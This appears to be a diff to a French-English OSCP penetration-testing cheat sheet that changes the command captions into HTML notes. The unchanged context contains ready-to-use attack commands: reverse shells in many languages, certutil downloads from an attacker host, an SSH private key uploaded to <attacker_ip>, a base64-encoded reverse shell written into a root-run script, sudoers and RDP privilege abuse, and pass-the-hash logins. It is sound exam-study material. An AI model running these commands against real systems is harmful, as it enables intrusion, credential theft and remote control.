@@ -11,7 +11,7 @@ Commandes courantes et outils complémentaires.
 ### Bash
 
 
-Commande `/bin/bash` pour la rubrique « Bash ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil /bin/bash.</p>
 
 ```bash
 # Direct Bash reverse shell
@@ -22,7 +22,7 @@ echo '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> file
 ```
 
 
-Commande `rm` pour la rubrique « Bash ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil rm.</p>
 
 ```bash
 # FIFO method with Netcat
@@ -36,14 +36,14 @@ sh -i >& /dev/tcp/<TARGET_IP>/<TARGET_PORT> 0>&1
 ### CMD
 
 
-Commande `c` pour la rubrique « CMD ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil c.</p>
 
 ```text
 C:\Windows\System32\nc.exe
 ```
 
 
-Commande `certutil.exe` pour la rubrique « CMD ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil certutil.exe.</p>
 
 ```bash
 # Download Netcat from a CMD
@@ -60,7 +60,7 @@ certutil.exe -urlcache -split -f http://[attacker_ip]/nc.exe nc.exe
 ### Golang
 
 
-Commande `echo` pour la rubrique « Golang ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil echo.</p>
 
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<TARGET_IP>:<TARGET_PORT>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go
@@ -70,7 +70,7 @@ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","
 ### Java
 
 
-Commande `r` pour la rubrique « Java ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil r.</p>
 
 ```text
 r = Runtime.getRuntime()
@@ -82,7 +82,7 @@ p.waitFor()
 ### Lua
 
 
-Commande `lua` pour la rubrique « Lua ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil lua.</p>
 
 ```bash
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('<TARGET_IP>',<TARGET_PORT>);os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -94,7 +94,7 @@ lua -e "require('socket');require('os');t=socket.tcp();t:connect('<TARGET_IP>',<
 Vérifier les ports et les services de la cible autorisée.
 
 
-Tester ou établir une connexion réseau avec Netcat.
+<p class="oscp-command-note">Tester ou établir une connexion réseau avec Netcat.</p>
 
 ```bash
 # Using -e
@@ -112,7 +112,7 @@ echo 'nc [lhost] [lport] -e /bin/bash' >> [file]
 ### Perl
 
 
-Commande `perl` pour la rubrique « Perl ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil perl.</p>
 
 ```bash
 perl -e 'use Socket;$i="<TARGET_IP>";$p=<TARGET_PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
@@ -124,7 +124,7 @@ perl -e 'use Socket;$i="<TARGET_IP>";$p=<TARGET_PORT>;socket(S,PF_INET,SOCK_STRE
 Observer les permissions et la configuration de Windows.
 
 
-Commande `powershell` pour la rubrique « PowerShell ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil powershell.</p>
 
 ```powershell
 # Main Option
@@ -140,7 +140,7 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<TARGET_IP>', 
 Examiner les entrées et les réponses de l'application web.
 
 
-Commande `php` pour la rubrique « PHP ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil php.</p>
 
 ```bash
 php -r '$sock=fsockopen("<TARGET_IP>",<TARGET_PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
@@ -150,7 +150,7 @@ php -r '$sock=fsockopen("<TARGET_IP>",<TARGET_PORT>);exec("/bin/sh -i <&3 >&3 2>
 ### Python
 
 
-Commande `python` pour la rubrique « Python ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil python.</p>
 
 ```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TARGET_IP>",<TARGET_PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
@@ -160,7 +160,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ### Ruby
 
 
-Commande `ruby` pour la rubrique « Ruby ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ruby.</p>
 
 ```bash
 ruby -rsocket -e 'f=TCPSocket.open("<TARGET_IP>",<TARGET_PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
@@ -170,7 +170,7 @@ ruby -rsocket -e 'f=TCPSocket.open("<TARGET_IP>",<TARGET_PORT>).to_i;exec sprint
 ### Socat
 
 
-Commande `socat` pour la rubrique « Socat ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil socat.</p>
 
 ```bash
 socat TCP:<TARGET_IP>:<TARGET_PORT> EXEC:/bin/bash
@@ -180,7 +180,7 @@ socat TCP:<TARGET_IP>:<TARGET_PORT> EXEC:/bin/bash
 ### Telnet
 
 
-Commande `rm` pour la rubrique « Telnet ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil rm.</p>
 
 ```bash
 rm -f /tmp/p; mknod /tmp/p p && telnet <TARGET_IP> <TARGET_PORT> 0</tmp/p | /bin/sh 1>/tmp/p 2>&1
@@ -190,7 +190,7 @@ rm -f /tmp/p; mknod /tmp/p p && telnet <TARGET_IP> <TARGET_PORT> 0</tmp/p | /bin
 ### Tool for Generating Reverse Shell
 
 
-Commande `git` pour la rubrique « Tool for Generating Reverse Shell ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil git.</p>
 
 ```bash
 git clone https://github.com/ShutdownRepo/shellerator
@@ -204,7 +204,7 @@ shellrator
 ### Adjust Interactive Shells
 
 
-Commande `stty` pour la rubrique « Adjust Interactive Shells ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil stty.</p>
 
 ```bash
 # Find terminal size (replace values with actual output)
@@ -225,7 +225,7 @@ stty rows <ROWS> columns <COLS>
 ### Bash
 
 
-Commande `bash` pour la rubrique « Bash ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil bash.</p>
 
 ```bash
 # Spawn a new Bash shell
@@ -236,7 +236,7 @@ bash -i
 ### Lua
 
 
-Commande `os.execute` pour la rubrique « Lua ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil os.execute.</p>
 
 ```text
 # Execute a new Bash shell
@@ -247,7 +247,7 @@ os.execute('/bin/bash')
 ### Perl
 
 
-Commande `perl` pour la rubrique « Perl ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil perl.</p>
 
 ```bash
 # Execute a new Bash shell
@@ -258,7 +258,7 @@ perl -e 'exec "/bin/bash"'
 ### Python
 
 
-Commande `python` pour la rubrique « Python ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil python.</p>
 
 ```python
 # Python 2.x
@@ -275,7 +275,7 @@ python -c 'import pty; import os; pty.spawn("/bin/bash"); os.system("stty raw -e
 ### Ruby
 
 
-Commande `exec` pour la rubrique « Ruby ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil exec.</p>
 
 ```ruby
 # Execute a new Bash shell
@@ -286,7 +286,7 @@ exec "/bin/bash"
 ### Sh
 
 
-Commande `sh` pour la rubrique « Sh ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil sh.</p>
 
 ```text
 # Spawn a new interactive shell
@@ -307,14 +307,12 @@ Examiner les objets, les droits et les services du domaine.
 #### Other Utilitaires
 
 
-Commande `apt` pour la rubrique « Other Utilitaires ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil apt.</p>
 
 ```bash
 sudo apt install krb5-user
 ```
 
-
-Commande `apt` pour la rubrique « Other Utilitaires ».
 
 ```bash
 sudo apt update && sudo apt upgrade && sudo apt install putty-tools
@@ -331,7 +329,7 @@ Observer les permissions et la configuration de Windows.
 Examiner les objets, les droits et les services du domaine.
 
 
-Commande `.` pour la rubrique « BloodHound Tools ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ..</p>
 
 ```text
 .\SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.49.194 445 -e powershell.exe"
@@ -348,7 +346,7 @@ Examiner les objets, les droits et les services du domaine.
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-Commande `xfreerdp` pour la rubrique « Using Credentials ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil xfreerdp.</p>
 
 ```bash
 xfreerdp /compression +auto-reconnect /u:[user] /p:'[password]' /v:[IP] +clipboard /size:1920x1080 /drive:desktop,/home/[your_username]/Desktop
@@ -360,7 +358,7 @@ xfreerdp /compression +auto-reconnect /u:[user] /p:'[password]' /v:[IP] +clipboa
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-Commande `xfreerdp` pour la rubrique « Using Hashes ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil xfreerdp.</p>
 
 ```bash
 # Using an NTLM hash.
@@ -373,7 +371,7 @@ xfreerdp /size:1920x1080 /v:[IP] /u:[user] /H:[hash] /cert:ignore /dynamic-resol
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-Commande `rdesktop` pour la rubrique « Prompt for Credentials ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil rdesktop.</p>
 
 ```bash
 # Useful when GUI is required for attacks.
@@ -384,7 +382,7 @@ rdesktop [IP]
 ### General RDP Connect
 
 
-Commande `xfreerdp` pour la rubrique « General RDP Connect ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil xfreerdp.</p>
 
 ```bash
 # Connect with a username and password
@@ -392,7 +390,7 @@ xfreerdp /size:1920x1080 /u:[user] /p:[password] /v:[host/ip] /drive:desktop,/ho
 ```
 
 
-Commande `rdesktop` pour la rubrique « General RDP Connect ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil rdesktop.</p>
 
 ```bash
 # Connect with specified dimensions and credentials
@@ -403,7 +401,7 @@ rdesktop [IP] -u [user] -p [password] -g 80%+150+100
 ### Enable RDP If Disabled
 
 
-Exemple technique pour la rubrique « Enable RDP If Disabled ».
+<p class="oscp-command-note">Exemple technique pour la rubrique « Enable RDP If Disabled ».</p>
 
 ```powershell
 $ComputerName = hostname
@@ -418,21 +416,21 @@ $ComputerName = hostname
 ```
 
 
-Commande `set-itemproperty` pour la rubrique « Enable RDP If Disabled ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil set-itemproperty.</p>
 
 ```powershell
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
 ```
 
 
-Commande `add-localgroupmember` pour la rubrique « Enable RDP If Disabled ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil add-localgroupmember.</p>
 
 ```powershell
 Add-LocalGroupMember -Group "Remote Desktop Users" -Member "[username]"
 ```
 
 
-Commande `add-adgroupmember` pour la rubrique « Enable RDP If Disabled ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil add-adgroupmember.</p>
 
 ```powershell
 # Option 1: Using Ad User
@@ -443,7 +441,7 @@ net localgroup "Remote Desktop Users" "[domain]\[username]" /add
 ```
 
 
-Examiner les informations AD ou réseau en PowerShell.
+<p class="oscp-command-note">Examiner les informations AD ou réseau en PowerShell.</p>
 
 ```powershell
 # This is done because if a firewall is configured, it may cause issues for our RDP
@@ -456,7 +454,7 @@ Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 ```
 
 
-Commande `new-aduser` pour la rubrique « Enable RDP If Disabled ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil new-aduser.</p>
 
 ```powershell
 # 1. Create the new user
@@ -483,7 +481,7 @@ rdesktop -u [username] -p 'P@ssword123!' -d [domain.com] [victim_ip]
 ## Decoding Techniques
 
 
-Commande `echo` pour la rubrique « Decoding Techniques ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil echo.</p>
 
 ```bash
 # Decode
@@ -494,8 +492,6 @@ echo -n "Hello" | od -An -t uC | tr -d ' \n'
 ```
 
 
-Commande `echo` pour la rubrique « Decoding Techniques ».
-
 ```bash
 # Decode
 echo "SGVsbG8gd29ybGQ=" | base64 -d
@@ -504,8 +500,6 @@ echo "SGVsbG8gd29ybGQ=" | base64 -d
 echo "Hello world" | base64
 ```
 
-
-Commande `echo` pour la rubrique « Decoding Techniques ».
 
 ```bash
 # Decode
@@ -516,8 +510,6 @@ echo "Hello world" | xxd -p
 ```
 
 
-Commande `echo` pour la rubrique « Decoding Techniques ».
-
 ```bash
 # Decode
 echo "dlrow olleH" | rev
@@ -527,8 +519,6 @@ echo "Hello world" | rev
 ```
 
 
-Commande `echo` pour la rubrique « Decoding Techniques ».
-
 ```bash
 # Decode
 echo "Uryyb jbeyq" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
@@ -537,8 +527,6 @@ echo "Uryyb jbeyq" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
 echo "Hello world" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
 ```
 
-
-Commande `echo` pour la rubrique « Decoding Techniques ».
 
 ```bash
 # Decode
@@ -552,14 +540,12 @@ echo "Hello World!" | python3 -c "import urllib.parse, sys; print(urllib.parse.q
 ### De base Requests
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl http://example.com
 ```
 
-
-Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 curl -H "Accept: application/json" http://example.com
@@ -569,35 +555,27 @@ curl -H "Accept: application/json" http://example.com
 ### Data Submission
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl -X POST -d "param1=value1&param2=value2" http://example.com/submit
 ```
 
 
-Récupérer une ressource distante ou une réponse HTTP.
-
 ```bash
 curl -H "Content-Type: application/json" -X POST -d '{"key1":"value1", "key2":"value2"}' http://example.com/api
 ```
 
-
-Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 curl -X POST -d "param1=value1&param2=value2" --data-urlencode http://example.com/submit
 ```
 
 
-Récupérer une ressource distante ou une réponse HTTP.
-
 ```bash
 curl -X PUT -d "param1=value1&param2=value2" http://example.com/update
 ```
 
-
-Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 curl -X DELETE http://example.com/delete
@@ -607,14 +585,12 @@ curl -X DELETE http://example.com/delete
 ### Authentification and Headers
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl -u username:password http://example.com
 ```
 
-
-Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 curl -A "CustomUserAgent/1.0" http://example.com
@@ -624,35 +600,27 @@ curl -A "CustomUserAgent/1.0" http://example.com
 ### Response Handling
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl -i http://example.com
 ```
 
 
-Récupérer une ressource distante ou une réponse HTTP.
-
 ```bash
 curl -o filename.html http://example.com
 ```
 
-
-Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 curl -I http://example.com
 ```
 
 
-Récupérer une ressource distante ou une réponse HTTP.
-
 ```bash
 curl -s http://example.com
 ```
 
-
-Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 curl -v http://example.com
@@ -662,21 +630,17 @@ curl -v http://example.com
 ### Cookies and Session Management
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl -b "cookie1=value1; cookie2=value2" http://example.com
 ```
 
 
-Récupérer une ressource distante ou une réponse HTTP.
-
 ```bash
 curl -c cookies.txt http://example.com
 ```
 
-
-Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 curl -b cookies.txt http://example.com
@@ -686,14 +650,12 @@ curl -b cookies.txt http://example.com
 ### File Operations
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl -F "file=@path/to/file" http://example.com/upload
 ```
 
-
-Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 curl -C - -o filename http://example.com/file
@@ -705,14 +667,12 @@ curl -C - -o filename http://example.com/file
 Configurer et comprendre les chemins de communication réseau.
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl -x http://proxyserver:port http://example.com
 ```
 
-
-Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 curl -k https://example.com
@@ -722,28 +682,22 @@ curl -k https://example.com
 ### Complémentaire Options
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl -L http://example.com
 ```
 
 
-Récupérer une ressource distante ou une réponse HTTP.
-
 ```bash
 curl --max-time 30 http://example.com
 ```
 
 
-Récupérer une ressource distante ou une réponse HTTP.
-
 ```bash
 curl -s -o /dev/null -w "%{http_code}" http://example.com
 ```
 
-
-Récupérer une ressource distante ou une réponse HTTP.
 
 ```bash
 curl --http2 http://example.com
@@ -753,28 +707,28 @@ curl --http2 http://example.com
 ## Generate a SSH Key
 
 
-Commande `ssh-keygen` pour la rubrique « Generate a SSH Key ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ssh-keygen.</p>
 
 ```bash
 ssh-keygen -t rsa -b 4096 -f /tmp/id_rsa -N ''
 ```
 
 
-Commande `python3` pour la rubrique « Generate a SSH Key ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil python3.</p>
 
 ```bash
 python3 -m http.server 80
 ```
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 curl -T /tmp/id_rsa http://<attacker_ip>/id_rsa
 ```
 
 
-Commande `rm` pour la rubrique « Generate a SSH Key ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil rm.</p>
 
 ```bash
 # Remove the key files from the victim machine to avoid leaving sensitive files.
@@ -782,7 +736,7 @@ rm /tmp/id_rsa /tmp/id_rsa.pub
 ```
 
 
-Récupérer une ressource distante ou une réponse HTTP.
+<p class="oscp-command-note">Récupérer une ressource distante ou une réponse HTTP.</p>
 
 ```bash
 # Replace <victim_ip> with the IP address where the private key was uploaded.
@@ -790,14 +744,14 @@ wget http://<victim_ip>/id_rsa
 ```
 
 
-Commande `chmod` pour la rubrique « Generate a SSH Key ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil chmod.</p>
 
 ```bash
 chmod 600 id_rsa
 ```
 
 
-Se connecter avec une clé SSH privée.
+<p class="oscp-command-note">Se connecter avec une clé SSH privée.</p>
 
 ```bash
 ssh -i id_rsa user@<victim_ip>
@@ -809,7 +763,7 @@ ssh -i id_rsa user@<victim_ip>
 Observer les permissions et la configuration de Windows.
 
 
-Commande `int` pour la rubrique « Cross Compiling for Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil int.</p>
 
 ```text
 #include <stdlib.h>
@@ -823,7 +777,7 @@ int main ()
 ```
 
 
-Commande `bool` pour la rubrique « Cross Compiling for Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil bool.</p>
 
 ```text
 #include <windows.h>  
@@ -848,7 +802,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
 ```
 
 
-Commande `x86_64-w64-mingw32-gcc` pour la rubrique « Cross Compiling for Windows ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil x86_64-w64-mingw32-gcc.</p>
 
 ```bash
 # Cross-Compile the C Code to a 64-bit Application
@@ -862,14 +816,14 @@ x86_64-w64-mingw32-gcc -shared -o adduser.dll adduser.c -Wl,--subsystem,windows
 ## Managing Flags
 
 
-Rechercher ou filtrer des données.
+<p class="oscp-command-note">Rechercher ou filtrer des données.</p>
 
 ```bash
 find / -type f -name local.txt 2>/dev/null
 ```
 
 
-Commande `hostname` pour la rubrique « Managing Flags ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil hostname.</p>
 
 ```bash
 # Linux
@@ -883,7 +837,7 @@ hostname && whoami && type [local/proof].txt && ipconfig /all
 ## Complémentaire Tips
 
 
-Commande `ls` pour la rubrique « Complémentaire Tips ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil ls.</p>
 
 ```bash
 # Example file ownership before change
@@ -899,7 +853,7 @@ ls -l id_rsa
 ```
 
 
-Commande `usermod` pour la rubrique « Complémentaire Tips ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil usermod.</p>
 
 ```bash
 # Add a user to a group
@@ -907,14 +861,14 @@ sudo usermod -aG <group_name> <username>
 ```
 
 
-Commande `exiftool` pour la rubrique « Complémentaire Tips ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil exiftool.</p>
 
 ```bash
 exiftool -a -u [file.extension]
 ```
 
 
-Commande `hashid` pour la rubrique « Complémentaire Tips ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil hashid.</p>
 
 ```bash
 hashid [hash]
@@ -925,7 +879,7 @@ hashid [hash]
 `xato-net-10-million-usernames.txt` · `/etc/sudoers`  
 
 
-Commande `cd` pour la rubrique « Complémentaire Tips ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil cd.</p>
 
 ```bash
 # The idea is to have the sudoers file with this line: emma ALL=(root) NOPASSWD: ALL
@@ -942,21 +896,21 @@ sudo /bin/bash
 ```
 
 
-Commande `echo` pour la rubrique « Complémentaire Tips ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil echo.</p>
 
 ```bash
 echo "-----BEGIN OPENSSH PRIVATE KEY----- ... -----END OPENSSH PRIVATE KEY-----" > /tmp/id_rsa
 ```
 
 
-Rechercher ou filtrer des données.
+<p class="oscp-command-note">Rechercher ou filtrer des données.</p>
 
 ```bash
 find [directoryPath] -maxdepth 5 -name "*.php" -exec grep -Hni "password" {} \; 2>/dev/null
 ```
 
 
-Commande `echo` pour la rubrique « Complémentaire Tips ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil echo.</p>
 
 ```bash
 # Shen found a script owned and run by root but writable for us
@@ -975,7 +929,7 @@ echo "echo -n 'c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NS4xNzYvODAgMD4mMQ=='|base64 
 ```
 
 
-Commande `locate` pour la rubrique « Complémentaire Tips ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil locate.</p>
 
 ```powershell
 # Find a file
@@ -1022,7 +976,7 @@ dir /b/s "<FILE>"
 ```
 
 
-Commande `groupadd` pour la rubrique « Complémentaire Tips ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil groupadd.</p>
 
 ```bash
 # Create a new group with a specific GID
@@ -1036,7 +990,7 @@ sudo passwd <username>
 ```
 
 
-Commande `export` pour la rubrique « Complémentaire Tips ».
+<p class="oscp-command-note">Exemple avec l&#x27;outil export.</p>
 
 ```bash
 # Linux
